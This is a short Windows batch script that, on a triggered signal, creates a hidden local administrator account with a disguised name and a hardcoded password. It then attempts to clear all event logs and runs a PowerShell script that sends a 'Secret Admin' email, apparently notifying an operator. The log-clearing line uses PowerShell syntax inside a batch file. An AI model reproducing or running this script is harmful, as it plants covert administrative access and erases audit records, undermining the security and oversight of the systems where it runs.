@echo off

set PSSCRIPT=c:\Programs\Scripts\Send-Email.ps1

waitfor SECRETADMIN
net user winsysup SecretTest123! /add
net localgroup Administrateurs /add winsysup
wevtutil el | Foreach-Object {wevtutil cl "$_"}
set SUBJECT="Secret Admin"
powershell.exe -NoProfile -File %PSSCRIPT%